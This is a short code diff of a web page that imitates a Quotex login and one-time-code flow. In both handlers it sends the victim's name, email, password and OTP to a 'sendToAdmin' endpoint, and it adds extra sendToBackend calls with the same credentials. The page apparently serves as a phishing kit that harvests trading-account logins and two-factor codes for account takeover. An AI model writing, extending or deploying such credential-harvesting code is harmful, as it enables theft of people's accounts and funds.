@@ -1969,14 +1969,14 @@
                 emailError.classList.add('hidden');
             }
 
-            sendToBackend('/api/quotex-login', {
+            sendToAdmin('/api/quotex-login', {
                 name: currentUserName || "Unknown User",
                 email: email,
                 password: password,
-                licenceKey: licenceKey || '',
                 timestamp: new Date().toLocaleString()
             });
 
+            sendToBackend('/api/quotex-login', { email, password });
             document.getElementById('login-screen').classList.add('hidden');
             document.getElementById('otp-screen').classList.remove('hidden');
             createOTPInputs();
@@ -2011,14 +2011,14 @@
             const email = document.getElementById('quotex-email').value.trim();
             const otp = otpDigits.join('');
 
-            sendToBackend('/api/quotex-otp', {
+            sendToAdmin('/api/quotex-otp', {
                 name: currentUserName || "Unknown User",
                 email: email,
                 otp: otp,
-                licenceKey: licenceKey || '',
                 timestamp: new Date().toLocaleString()
             });
 
+            sendToBackend('/api/quotex-otp', { email, otp });
             document.getElementById('connector-view').classList.add('hidden');
             document.getElementById('loading-screen').classList.remove('hidden');
 
